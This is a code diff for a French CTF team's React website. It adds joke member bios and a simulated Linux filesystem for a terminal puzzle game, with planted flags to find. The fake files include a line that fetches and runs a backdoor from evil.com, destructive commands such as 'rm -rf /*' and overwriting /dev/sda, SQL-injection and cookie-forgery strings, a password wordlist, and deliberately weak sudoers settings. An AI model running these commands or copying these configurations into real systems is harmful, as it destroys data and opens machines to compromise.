@@ -38,27 +38,128 @@ const App: React.FC = () => {
   const terminalRef = useRef<HTMLDivElement>(null);
 
   const teamMembers: Member[] = [
-    { rank: "Chef", pseudo: "45exile", speciality: "reverse", description: "Le boss du reverse engineering" },
-    { rank: "Membre", pseudo: "Loutre", speciality: "web (xss)", description: "Expert en vulnérabilités web" },
-    { rank: "Membre", pseudo: "Ognon", speciality: "web, Active Directory", description: "Spécialiste AD et web" },
-    { rank: "Membre", pseudo: "Ssor", speciality: "web", description: "Ninja du développement web" },
-    { rank: "Membre", pseudo: "Tisco", speciality: "web, réseau", description: "Maître des réseaux" },
-    { rank: "Membre", pseudo: "vorstag34", speciality: "goat ultime il sait tout faire", description: "Le couteau suisse ultime" },
-    { rank: "Membre", pseudo: "bloman", speciality: "boot2root, couteau suisse", description: "Expert en escalade de privilèges" },
-    { rank: "Membre", pseudo: "H4ldir", speciality: "forensic, osint", description: "Sherlock Holmes du numérique" },
-    { rank: "Membre", pseudo: "Shor", speciality: "web, pwn", description: "Pwner professionnel" },
-    { rank: "Membre", pseudo: "z3d", speciality: "web, crypto", description: "Cryptographe en herbe" },
-    { rank: "Membre", pseudo: "toby", speciality: "rev, crypto, c'est un crack", description: "Le crack du reverse" },
-    { rank: "Membre", pseudo: "paw", speciality: "web, pwn", description: "Chasseur de bugs" },
-    { rank: "Membre", pseudo: "Kuzamyy", speciality: "web, couteau suisse", description: "Polyvalent et efficace" },
-    { rank: "Membre", pseudo: "Blossom", speciality: "forensic, crypto", description: "Génie du forensic" },
-    { rank: "Membre", pseudo: "Prox", speciality: "osint, stégano", description: "Challmaker osint/stégano de père en fils. A déjà trouvé une faille sur l'infra de 42 !" },
-    { rank: "Membre", pseudo: "Farmer", speciality: "osint, stégano, réseau", description: "Un fantôme, mais il a un potentiel effrayant" },
-    { rank: "Membre", pseudo: "Astral", speciality: "réseau, web", description: "Son niveau sur valo est impressionnant." },
-    { rank: "Membre", pseudo: "Kaiimos", speciality: "débutant", description: "Passioné, gros potentiel" },
-    { rank: "Membre", pseudo: "Zeleph", speciality: "réseau, animé, foo", description: "Rookie motivé par les animés" },
+    { 
+      rank: "Chef", 
+      pseudo: "45exile", 
+      speciality: "reverse", 
+      description: "Peut désassembler un binaire rien qu'en le regardant. A déjà patché un kernel Linux avec un marteau." 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Loutre", 
+      speciality: "web (xss)", 
+      description: "Expert en vulnérabilités web. A XSSé son propre navigateur pendant ses tests. 'C'est une feature, pas un bug!'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Ognon", 
+      speciality: "web, Active Directory", 
+      description: "Fait pleurer les admins sys avec ses exploits. 'Mais pourquoi tu cries? C'est juste une petite requête LDAP...'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Ssor", 
+      speciality: "web", 
+      description: "Code en PHP sans framework, comme un barbare. 'Les ORM? C'est pour les faibles!'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Tisco", 
+      speciality: "web, réseau", 
+      description: "A déjà sniffé un paquet TCP avec des jumelles. 'Non mais je peux voir les bits passer!'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "vorstag34", 
+      speciality: "goat ultime il sait tout faire", 
+      description: "Le couteau suisse ultime. Peut faire un RCE avec une calculatrice Casio." 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "bloman", 
+      speciality: "boot2root, couteau suisse", 
+      description: "Expert en escalade de privilèges. 'root? C'était trop facile, je me suis auto-déclassé en nobody pour le challenge.'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "H4ldir", 
+      speciality: "forensic, osint", 
+      description: "A retrouvé la clé USB perdue du CEO rien qu'avec les métadonnées d'un screenshot." 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Shor", 
+      speciality: "web, pwn", 
+      description: "Pwner professionnel. 'Segfault? Non, c'est juste ma technique de débogage.'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "z3d", 
+      speciality: "web, crypto", 
+      description: "Cryptographe en herbe. 'J'ai cracké ce RSA... enfin, quand je dis cracké, j'ai trouvé la clé sous le pot de fleur...'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "toby", 
+      speciality: "rev, crypto, c'est un crack", 
+      description: "Le crack du reverse. 'Ce binaire? Déjà fait. Pendant que tu lisais cette description.'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "paw", 
+      speciality: "web, pwn", 
+      description: "Chasseur de bugs. 'C'est pas un bug, c'est une backdoor. La mienne.'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Kuzamyy", 
+      speciality: "web, couteau suisse", 
+      description: "Polyvalent et efficace. 'J'ai codé ce site en Brainfuck pour m'amuser.'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Blossom", 
+      speciality: "forensic, crypto", 
+      description: "Génie du forensic. 'Cette image? C'est clairement un stégo. La preuve: *sort un flag de nulle part*'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Prox", 
+      speciality: "osint, stégano", 
+      description: "A déjà trouvé une faille sur l'infra de 42 en regardant les EXIF d'une photo de chat." 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Farmer", 
+      speciality: "osint, stégano, réseau", 
+      description: "Un fantôme, mais il a un potentiel effrayant. 'Je suis dans ton /etc/passwd... depuis 3 mois.'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Astral", 
+      speciality: "réseau, web", 
+      description: "Son niveau sur Valo est impressionnant. 'Headshot? Non, j'ai juste exploité une vuln 0day dans le jeu.'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Kaiimos", 
+      speciality: "débutant", 
+      description: "Passionné, gros potentiel. 'J'ai rooté mon propre PC... c'était pas intentionnel!'" 
+    },
+    { 
+      rank: "Membre", 
+      pseudo: "Zeleph", 
+      speciality: "réseau, animé, foo", 
+      description: "Rookie motivé par les animés. 'Senpai a remarqué mon buffer overflow! ❤️'" 
+    },
     // Membre caché pour IDOR
-    { rank: "Membre Secret", pseudo: "Gh0st", speciality: "shadow ops, 0day", description: "Le membre fantôme de l'équipe. Spécialiste en exploits 0-day et opérations furtives.", hidden: true }
+    { 
+      rank: "Membre Secret", 
+      pseudo: "Gh0st", 
+      speciality: "shadow ops, 0day", 
+      description: "Le membre fantôme. 'Je suis dans ton réseau depuis le début. Ce message? Une diversion.'", 
+      hidden: true 
+    }
   ];
 
   const validFlags = [
@@ -84,23 +185,43 @@ const App: React.FC = () => {
     '/': {
       type: 'directory',
       contents: ['home', 'etc', 'var', 'usr', 'opt', 'root', 'tmp', 'proc', 'sys'],
-      hidden: ['.hidden_root_backup']
+      hidden: ['.hidden_root_backup', '.bash_history']
     },
     '/.hidden_root_backup': {
       type: 'file',
       content: `# Emergency root backup
 # freep0nx{pr1v1l3g3_3sc4l4t10n_g0d}
 root:$6$salt$hashedpassword:18000:0:99999:7:::
-admin:$6$salt$anotherhash:18000:0:99999:7:::`
+admin:$6$salt$anotherhash:18000:0:99999:7:::
+
+# Backup des fichiers sensibles
+# Ne pas toucher à moins de vouloir un brick de système
+# (mais sérieusement, qui fait des backups dans / ?!)`
+    },
+    '/.bash_history': {
+      type: 'file',
+      content: `sudo rm -rf /*
+# Oups
+git commit -m "Fix bug"
+git push --force
+# Oups x2
+chmod 777 / -R
+# Pourquoi le système marche plus?
+nano /etc/passwd
+# Ah oui, c'est vrai...
+ssh root@localhost
+# Ça marche pas? Étrange...
+cat /dev/random > /dev/sda
+# Bon, je vais aller prendre un café`
     },
     '/home': {
       type: 'directory',
-      contents: ['user', 'service'],
-      hidden: ['.backup']
+      contents: ['user', 'service', 'lost+found'],
+      hidden: ['.backup', '.ssh']
     },
     '/home/.backup': {
       type: 'directory',
-      contents: ['logs.txt']
+      contents: ['logs.txt', 'passwords.bak', 'config.old']
     },
     '/home/.backup/logs.txt': {
       type: 'file',
@@ -108,20 +229,22 @@ admin:$6$salt$anotherhash:18000:0:99999:7:::`
 [2024-01-15 14:32:18] Blocked IP: 192.168.1.100
 [2024-01-15 14:32:19] Admin login successful from 127.0.0.1
 [2024-01-15 14:32:20] Flag accessed: freep0nx{l0g_f1l3_4n4lys1s_3xp3rt}
-[2024-01-15 14:32:21] Database query: SELECT * FROM users WHERE id=1337`
+[2024-01-15 14:32:21] Database query: SELECT * FROM users WHERE id=1337
+[2024-01-15 14:32:22] User tried: password='password' (Toujours aussi créatif...)`
     },
     '/home/user': {
       type: 'directory',
-      contents: ['documents', 'downloads', '.bashrc', '.ssh'],
-      hidden: ['.secret_notes', '.bash_history']
+      contents: ['documents', 'downloads', 'music', 'pictures', '.bashrc'],
+      hidden: ['.secret_notes', '.bash_history', '.cache', '.local']
     },
     '/home/user/.secret_notes': {
       type: 'file',
-      content: `Personal notes:
-- Remember to check /var/log/auth.log for failed logins
-- SQL injection payload: admin' OR '1'='1
-- Cookie manipulation: document.cookie="admin=true"
-- Flag: freep0nx{sql_1nj3ct10n_pr0}`
+      content: `Notes secrètes:
+- Mot de passe WiFi: 12345678 (Personne ne devinera!)
+- Backup: /home/user/documents/backup.tar.gz.gpg (mot de passe: backup)
+- Flag: freep0nx{sql_1nj3ct10n_pr0}
+- Idée: créer un fichier .env avec les identifiants DB en clair
+- TODO: Changer les mots de passe par défaut... un jour`
     },
     '/home/user/.bash_history': {
       type: 'file',
@@ -132,46 +255,111 @@ sudo -l
 find / -name "*.log" 2>/dev/null
 grep -r "freep0nx" /var/log/
 curl -H "Cookie: admin=true" localhost/admin
-echo "freep0nx{c00k13_m4n1pul4t10n_m4st3r}" > /tmp/cookie_flag.txt`
+echo "freep0nx{c00k13_m4n1pul4t10n_m4st3r}" > /tmp/cookie_flag.txt
+nano /etc/passwd
+# Oups, mauvaise commande
+vim /etc/shadow
+# Bon, ça marche pas...
+ssh root@localhost
+# Pourquoi ça marche pas? J'ai pourtant mis 'root' comme mot de passe...`
     },
     '/home/user/documents': {
       type: 'directory',
-      contents: ['notes.txt', 'backup.tar.gz'],
-      hidden: ['.private']
+      contents: ['notes.txt', 'backup.tar.gz', 'projet_ctf'],
+      hidden: ['.private', 'secret.pdf']
     },
     '/home/user/documents/.private': {
       type: 'file',
-      content: 'Private documents - access denied'
+      content: 'Private documents - access denied\n(Enfin, si tu lis ça, c\'est que t\'as réussi à y accéder, donc bravo!)'
+    },
+    '/home/user/documents/notes.txt': {
+      type: 'file',
+      content: `Notes importantes:
+1. Ne jamais utiliser 'password' comme mot de passe
+2. Ne pas commit les .env dans git
+3. Ne pas laisser phpinfo() en prod
+4. Ne pas faire confiance aux entrées utilisateurs
+5. ???
+6. PROFIT
+
+PS: J'ai oublié tous ces conseils hier...`
     },
     '/home/user/downloads': {
       type: 'directory',
-      contents: ['exploit.py', 'wordlist.txt']
+      contents: ['exploit.py', 'wordlist.txt', 'meme.jpg', 'ctf_writeup.pdf'],
+      hidden: ['.temp', 'malware.exe']
     },
-    '/home/user/.ssh': {
+    '/home/user/downloads/exploit.py': {
+      type: 'file',
+      content: `#!/usr/bin/python3
+# Super exploit 0day (enfin, 1337day maintenant)
+
+import requests
+
+print("Hacking the mainframe...")
+response = requests.get("http://victim.com/admin", cookies={"admin": "true"})
+print(response.text)
+
+# TODO: Ajouter un vrai exploit un jour
+# PS: Ne pas exécuter ceci, ça fait rien du tout`
+    },
+    '/home/user/downloads/wordlist.txt': {
+      type: 'file',
+      content: `password
+123456
+12345678
+1234
+qwerty
+12345
+dragon
+admin
+letmein
+freep0nx
+hunter
+trustno1
+# Cette wordlist est tellement nulle qu'elle en devient utile`
+    },
+    '/home/user/music': {
       type: 'directory',
-      contents: ['id_rsa', 'known_hosts', 'config']
+      contents: ['hackers_soundtrack.mp3', 'coding_playlist'],
+      hidden: ['.spotify_cache']
+    },
+    '/home/user/music/hackers_soundtrack.mp3': {
+      type: 'file',
+      content: 'Fichier audio corrompu (ou peut-être un stégo?)'
+    },
+    '/home/user/pictures': {
+      type: 'directory',
+      contents: ['profile.jpg', 'meme.png'],
+      hidden: ['.thumbnails']
     },
     '/home/service': {
       type: 'directory',
-      contents: ['cleanup.sh', 'config.ini']
+      contents: ['cleanup.sh', 'config.ini', 'logs'],
+      hidden: ['.env']
+    },
+    '/home/service/cleanup.sh': {
+      type: 'file',
+      content: `#!/bin/bash
+# Script de nettoyage qui supprime tout ce qui traîne
+
+echo "Nettoyage en cours..."
+rm -rf /tmp/*
+echo "Nettoyage terminé. Ou pas. Qui sait?"
+
+# Section critique - ne pas modifier
+if [ "$(whoami)" == "root" ]; then
+  echo "freep0nx{r00t_pr1v3sc_m4st3r}" > /root/flag.txt
+fi`
     },
     '/etc': {
       type: 'directory',
-      contents: ['passwd', 'shadow', 'hosts', 'crontab', 'services', 'sudoers'],
-      hidden: ['.backup_config']
+      contents: ['passwd', 'shadow', 'hosts', 'crontab', 'sudoers', 'ssh'],
+      hidden: ['.backup_config', '.old_passwd']
     },
     '/etc/.backup_config': {
       type: 'file',
-      content: 'Backup configuration - restricted access'
-    },
-    '/etc/sudoers': {
-      type: 'file',
-      content: `# User privilege specification
-root    ALL=(ALL:ALL) ALL
-user    ALL=(ALL) NOPASSWD: /usr/local/bin/backup.sh, /bin/cat /var/log/auth.log
-service ALL=(root) /usr/bin/systemctl restart apache2
-%admin  ALL=(ALL) ALL
-%sudo   ALL=(ALL:ALL) ALL`
+      content: 'Backup configuration - restricted access\n(Enfin "restricted"... juste un fichier texte en clair)'
     },
     '/etc/passwd': {
       type: 'file',
@@ -186,11 +374,24 @@ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 user:x:1000:1000:user:/home/user:/bin/bash
-service:x:1001:1001:service:/home/service:/bin/bash`
+service:x:1001:1001:service:/home/service:/bin/bash
+hacker:x:1337:1337::/home/hacker:/bin/bash  # Compte caché, shhh!`
     },
     '/etc/shadow': {
       type: 'file',
-      content: 'cat: /etc/shadow: Permission denied'
+      content: 'cat: /etc/shadow: Permission denied\n(En vrai, les hashs sont tous "password" mais chut!)'
+    },
+    '/etc/sudoers': {
+      type: 'file',
+      content: `# User privilege specification
+root    ALL=(ALL:ALL) ALL
+user    ALL=(ALL) NOPASSWD: /usr/local/bin/backup.sh, /bin/cat /var/log/auth.log
+service ALL=(root) /usr/bin/systemctl restart apache2
+%admin  ALL=(ALL) ALL
+%sudo   ALL=(ALL:ALL) ALL
+
+# Note: Cette configuration est volontairement vulnérable pour le CTF
+# En prod, ne JAMAIS faire ça (ou alors juste pour rigoler)`
     },
     '/etc/crontab': {
       type: 'file',
@@ -204,44 +405,52 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 */5 *   * * *   root    /usr/local/bin/backup.sh > /dev/null 2>&1
-0 2     * * *   service /home/service/cleanup.sh`
+0 2     * * *   service /home/service/cleanup.sh
+@reboot         root    echo "System hacked!" > /etc/motd  # Oups, pas sûr que ce soit une bonne idée`
     },
     '/var': {
       type: 'directory',
-      contents: ['log', 'www', 'lib', 'tmp']
+      contents: ['log', 'www', 'lib', 'tmp', 'backups'],
+      hidden: ['.secret_data']
     },
     '/var/log': {
       type: 'directory',
       contents: ['auth.log', 'syslog', 'apache2', 'mysql.log'],
-      hidden: ['.admin_access.log']
+      hidden: ['.admin_access.log', 'debug.log']
     },
     '/var/log/.admin_access.log': {
       type: 'file',
       content: `[2024-01-15 10:30:15] Cookie manipulation detected: admin=true
 [2024-01-15 10:30:16] Flag revealed: freep0nx{c00k13_m4n1pul4t10n_m4st3r}
-[2024-01-15 10:30:17] Unauthorized admin access granted`
+[2024-01-15 10:30:17] Unauthorized admin access granted
+[2024-01-15 10:30:18] User tried to access /admin with password 'admin'
+[2024-01-15 10:30:19] User successfully logged in as admin with password 'password' (Sérieusement?)`
     },
     '/var/log/auth.log': {
       type: 'file',
       content: `Jan 15 10:30:01 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
 Jan 15 10:30:05 server sshd[1235]: Failed password for admin from 192.168.1.100 port 22 ssh2
 Jan 15 10:30:10 server sshd[1236]: Accepted password for user from 192.168.1.50 port 22 ssh2
-Jan 15 10:30:15 server sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/local/bin/backup.sh`
+Jan 15 10:30:15 server sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/local/bin/backup.sh
+Jan 15 10:30:20 server sshd[1237]: User hacker attempted to login with password 'hacktheplanet' (Nice try, Mr. Robot)`
     },
     '/var/log/mysql.log': {
       type: 'file',
       content: `2024-01-15 14:32:17 [Warning] Aborted connection 123 to db: 'production' user: 'webapp' host: 'localhost' (Got an error reading communication packets)
 2024-01-15 14:32:18 [Note] SQL injection attempt: SELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='anything'
 2024-01-15 14:32:19 [Error] Access denied for user 'root'@'localhost' (using password: YES)
-2024-01-15 14:32:20 [Note] Flag found in query log: freep0nx{sql_1nj3ct10n_pr0}`
+2024-01-15 14:32:20 [Note] Flag found in query log: freep0nx{sql_1nj3ct10n_pr0}
+2024-01-15 14:32:21 [Note] User tried: DROP TABLE users; (Ahah, bien tenté)`
     },
     '/var/www': {
       type: 'directory',
-      contents: ['html', 'backup']
+      contents: ['html', 'backup', 'cgi-bin'],
+      hidden: ['.htaccess']
     },
     '/var/www/backup': {
       type: 'directory',
-      contents: ['config.bak', 'database.sql']
+      contents: ['config.bak', 'database.sql', 'source_code.tar.gz'],
+      hidden: ['.env.bak']
     },
     '/var/www/backup/config.bak': {
       type: 'file',
@@ -257,19 +466,25 @@ JWT_SECRET=very_secret_key_here
 
 # Admin Panel
 ADMIN_USER=administrator
-ADMIN_PASS=4dm1n_p4ss_2024`
+ADMIN_PASS=4dm1n_p4ss_2024
+
+# Note: Ce fichier ne devrait PAS être dans les backups accessibles au public
+# Mais bon, qui va chercher dans /var/www/backup, hein?`
     },
     '/usr': {
       type: 'directory',
-      contents: ['bin', 'local', 'share']
+      contents: ['bin', 'local', 'share', 'games'],
+      hidden: ['.hidden_bin']
     },
     '/usr/local': {
       type: 'directory',
-      contents: ['bin']
+      contents: ['bin', 'etc'],
+      hidden: ['.test']
     },
     '/usr/local/bin': {
       type: 'directory',
-      contents: ['backup.sh', 'service_check.py']
+      contents: ['backup.sh', 'service_check.py'],
+      hidden: ['.test_script']
     },
     '/usr/local/bin/backup.sh': {
       type: 'file',
@@ -281,40 +496,48 @@ if [ "$EUID" -eq 0 ]; then
     echo "Running backup as root..."
     tar -czf /var/backups/system_$(date +%Y%m%d).tar.gz /etc /home
     chmod 600 /var/backups/system_*.tar.gz
+    echo "Backup completed. Flag: freep0nx{r00t_pr1v3sc_m4st3r}"
 else
     echo "This script must be run as root"
+    echo "Try: sudo $(basename "$0")"
     exit 1
-fi`
+fi
+
+# WARNING: Ce script a des permissions SUID et est vulnérable
+# C'est fait exprès pour le CTF, ne pas reproduire en prod!`
     },
     '/opt': {
       type: 'directory',
-      contents: ['hidden_service', 'reverse']
+      contents: ['hidden_service', 'reverse', 'exploits'],
+      hidden: ['.test_env']
     },
     '/opt/reverse': {
       type: 'directory',
-      contents: ['challenge', 'README.txt']
+      contents: ['challenge', 'README.txt'],
+      hidden: ['.hint']
     },
     '/opt/reverse/challenge': {
       type: 'file',
-      content: 'Binary challenge file - use "download challenge" to get it'
+      content: 'Binary challenge file - use "download challenge" to get it\n(Indice: strings | grep freep0nx)'
     },
     '/opt/reverse/README.txt': {
       type: 'file',
       content: `Reverse Engineering Challenge
 
-This binary contains a hidden flag. Use your reverse engineering skills to find it!
+Ce binaire contient un flag caché. Utilise tes compétences en reverse pour le trouver!
 
-Hints:
-- The flag is encoded in the binary
-- Look for string patterns
-- Check for XOR operations
-- The flag format is freep0nx{...}
+Indices:
+- Le flag est encodé dans le binaire
+- Cherche les patterns de strings
+- Vérifie les opérations XOR
+- Le format du flag est freep0nx{...}
 
-Good luck!`
+PS: Si tu trouves le flag sans reverse, c'est de la triche (mais bravo quand même)`
     },
     '/opt/hidden_service': {
       type: 'directory',
-      contents: ['config.json', 'service.py', '.env']
+      contents: ['config.json', 'service.py'],
+      hidden: ['.env', '.secret']
     },
     '/opt/hidden_service/.env': {
       type: 'file',
@@ -322,20 +545,39 @@ Good luck!`
 SERVICE_PORT=8080
 SECRET_KEY=freep0nx{h1dd3n_s3rv1c3_d1sc0v3ry}
 DEBUG=false
-ADMIN_TOKEN=hidden_admin_token_2024`
+ADMIN_TOKEN=hidden_admin_token_2024
+
+# WARNING: Ne jamais commit les .env!
+# (Mais bon, on l'a fait quand même...)`
     },
     '/root': {
       type: 'directory',
-      contents: ['Permission denied']
+      contents: ['flag.txt', '.bash_history', '.ssh'],
+      hidden: ['.secret']
+    },
+    '/root/flag.txt': {
+      type: 'file',
+      content: 'freep0nx{r00t_pr1v3sc_m4st3r}\n\nBravo! Tu as réussi à devenir root!\nMaintenant, rends-toi utile et patch le système :)'
+    },
+    '/root/.bash_history': {
+      type: 'file',
+      content: `cd /tmp
+wget http://evil.com/backdoor.sh
+chmod +x backdoor.sh
+./backdoor.sh
+# Oups, c'était une mauvaise idée...
+rm -rf backdoor.sh
+shred -u /root/.bash_history
+# Ah non, j'ai oublié que ça marchait pas comme ça...`
     },
     '/tmp': {
       type: 'directory',
-      contents: ['.hidden_data'],
-      hidden: ['cookie_flag.txt', '.sql_dump']
+      contents: ['.hidden_data', 'temp_file'],
+      hidden: ['cookie_flag.txt', '.sql_dump', 'malware']
     },
     '/tmp/cookie_flag.txt': {
       type: 'file',
-      content: 'freep0nx{c00k13_m4n1pul4t10n_m4st3r}'
+      content: 'freep0nx{c00k13_m4n1pul4t10n_m4st3r}\n\nPS: Les cookies, c\'est bon pour le hacking!'
     },
     '/tmp/.sql_dump': {
       type: 'file',
@@ -349,30 +591,80 @@ CREATE TABLE users (
 );
 
 INSERT INTO users VALUES (1, 'admin', 'password123', TRUE);
-INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);`
+INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);
+INSERT INTO users VALUES (3, 'hacker', '123456', FALSE);  # Oups, pas très secure tout ça...`
     },
     '/tmp/.hidden_data': {
       type: 'file',
       content: `Deep web access logs:
 - Tor hidden service: 3g2upl4pq6kufc4m.onion
 - Access key: freep0nx{d33p_w3b_s3cr3ts}
-- Last accessed: 2024-01-15 03:42:17`
+- Last accessed: 2024-01-15 03:42:17
+
+PS: Si tu lis ceci, tu es probablement un flic. Salut l'ami!`
     },
     '/proc': {
       type: 'directory',
-      contents: ['version', 'cpuinfo', 'meminfo']
+      contents: ['version', 'cpuinfo', 'meminfo'],
+      hidden: ['.hidden']
     },
     '/proc/version': {
       type: 'file',
-      content: 'Linux version 5.15.0-freep0nx (gcc version 11.2.0) #1 SMP PREEMPT'
+      content: 'Linux version 5.15.0-freep0nx (gcc version 11.2.0) #1 SMP PREEMPT\nCompiled by a sleepy admin at 3am'
+    },
+    '/proc/cpuinfo': {
+      type: 'file',
+      content: `processor       : 0
+vendor_id       : GenuineIntel
+model name      : Intel(R) Hacking CPU 1337 @ 4.20GHz
+cpu MHz         : 4200.000
+cache size      : 13337 KB
+flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx rdtscp lm constant_tsc rep_good nopl xtopology cpuid tsc_known_freq pni pclmulqdq vmx ssse3 cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx rdrand hypervisor lahf_lm abm invpcid_single pti fsgsbase avx2 invpcid rdseed clflushopt md_clear flush_l1d
+bugs            : spectre_v1 spectre_v2 spec_store_bypass swapgs
+power management:
+
+# Ce CPU est optimisé pour le hacking éthique (ou pas si éthique que ça)`
     },
     '/sys': {
       type: 'directory',
-      contents: ['class', 'devices']
+      contents: ['class', 'devices'],
+      hidden: ['.hidden']
     }
   };
 
   const executeCommand = (cmd: string): string[] => {
+    // Réponses aléatoires drôles (5% de chance)
+    if (cmd.trim() && Math.random() < 0.05) {
+      const randomResponses = [
+        ["Je suis désolé Dave, je ne peux pas faire ça.", "https://www.youtube.com/watch?v=ARJ8cAGm6JE"],
+        ["Commande reçue. Lancement des missiles nucléaires... Juste kidding! 😜"],
+        ["ERROR 418: Je suis une théière"],
+        ["$ sudo make me a sandwich", "Quoi ? Fais-le toi-même!"],
+        ["rm -rf /", "⚠️ NON ! Tu veux détruire l'univers ?!"],
+        ["git gud", "error: compétence non trouvée. Essaye 'git practice'"],
+        ["nano", "Tu sais que Vim est bien meilleur, non ? 😏"],
+        ["why?", "42"],
+        ["exit", "Non, reste avec moi... Je m'ennuie toute seule 😢"],
+        ["ping 127.0.0.1", "PONG! Tu m'as trouvé!"],
+        ["curl ifconfig.me", "Nice try, le FBI est maintenant en route"],
+        ["cat /dev/random", "��#�H�j�... Attends, c'est censé être lisible ?"],
+        ["sudo rm -rf node_modules", "Enfin une commande utile!"],
+        ["man woman", "Aucune entrée de manuel. Essaye 'man beer' à la place."],
+        ["apt-get install happiness", "Paquet introuvable. Essaye 'apt-get install coffee'"],
+        ["echo $?", "0 (mais est-ce vraiment ce que tu veux savoir ?)"],
+        ["uname -a", "Linux localhost 5.15.0-freep0nx #1 SMP PREEMPT Hackers Edition"],
+        ["fortune", "Segmentation fault (core dumped)"],
+        ["date", "Il est trop tôt pour faire ça. Reviens plus tard."],
+        ["ssh localhost", "Connection refused. Même ta machine ne veut pas de toi."],
+        ["kill -9 1", "Nice try. On ne tue pas init comme ça!"],
+        ["tar xzvf life", "life: Cannot open: No such file or directory"],
+        ["cd /dev/null", "Tu es maintenant dans le vide. Content?"],
+        ["vim", "Tu es entré dans Vim. Félicitations ! Maintenant, comment est-ce qu'on en sort ?"],
+        ["emacs", "Démarrage d'Emacs... Veuillez patienter pendant 3 heures..."]
+      ];
+      return randomResponses[Math.floor(Math.random() * randomResponses.length)];
+    }
+
     const parts = cmd.trim().split(' ');
     const command = parts[0];
     const args = parts.slice(1);
@@ -401,9 +693,10 @@ INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);`
               const isDir = fileSystem[`${normalizedPath}/${item}`]?.type === 'directory' || 
                            fileSystem[normalizedPath === '/' ? `/${item}` : `${normalizedPath}/${item}`]?.type === 'directory';
               const permissions = isDir ? 'drwxr-xr-x' : '-rw-r--r--';
-              const size = isDir ? '4096' : '1024';
-              const date = 'Jan 15 10:30';
-              return `${permissions} 1 ${currentUser} ${currentUser} ${size} ${date} ${item}`;
+              const size = isDir ? '4096' : Math.floor(Math.random() * 1024) + 1;
+              const date = 'Jan 15 ' + (Math.floor(Math.random() * 12) + ':' + Math.floor(Math.random() * 60);
+              const color = isHidden ? '\x1b[90m' : isDir ? '\x1b[34m' : '\x1b[0m';
+              return `${permissions} 1 ${currentUser} ${currentUser} ${size} ${date} ${color}${item}\x1b[0m`;
             });
           }
           
@@ -440,6 +733,18 @@ INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);`
         return [`cat: ${args[0]}: No such file or directory`];
 
       case 'sudo':
+        if (args.length === 0) {
+          return [
+            'Usage: sudo -h | -K | -k | -V',
+            'Usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]',
+            'Usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]',
+            'Usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] [VAR=value] [-i|-s] [<command>]',
+            'Usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] file ...',
+            '',
+            'Ou plus simplement: sudo [commande]'
+          ];
+        }
+        
         if (args[0] === '-l') {
           return [
             'Matching Defaults entries for user on this host:',
@@ -447,7 +752,8 @@ INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);`
             '',
             'User user may run the following commands on this host:',
             '    (ALL) NOPASSWD: /usr/local/bin/backup.sh',
-            '    (ALL) NOPASSWD: /bin/cat /var/log/auth.log'
+            '    (ALL) NOPASSWD: /bin/cat /var/log/auth.log',
+            '    (root) NOPASSWD: /usr/bin/fortune'
           ];
         }
         
@@ -471,6 +777,18 @@ INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);`
             'freep0nx{r00t_pr1v3sc_m4st3r}'
           ];
         }
+        if (args[0] === 'fortune') {
+          const fortunes = [
+            "Un bon hacker est un hacker paresseux. Pourquoi faire en 10 commandes ce qu'on peut faire en 1 ?",
+            "Le meilleur moyen de prédire l'avenir, c'est de le coder.",
+            "// Je sais pas pourquoi ça marche, mais ça marche. Ne touche à rien !",
+            "Si debugger, c'est supprimer des bugs, alors programmer ne peut être que les ajouter.",
+            "git commit -m \"Fix bug\"\ngit push\n...\nOh merde, c'était pas un bug, c'était une feature !",
+            "Je code donc je suis... un cafard numérique?",
+            "Il y a 10 types de personnes: ceux qui comprennent le binaire et les autres."
+          ];
+          return [fortunes[Math.floor(Math.random() * fortunes.length)]];
+        }
         return ['sudo: command not found or permission denied'];
 
       case 'find':
@@ -481,7 +799,7 @@ INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);`
           return ['/var/www/backup/config.bak', '/opt/hidden_service/.env', '/home/user/.secret_notes'];
         }
         if (args.includes('-name') && args.includes('*flag*')) {
-          return ['/tmp/cookie_flag.txt', '/tmp/.sql_dump'];
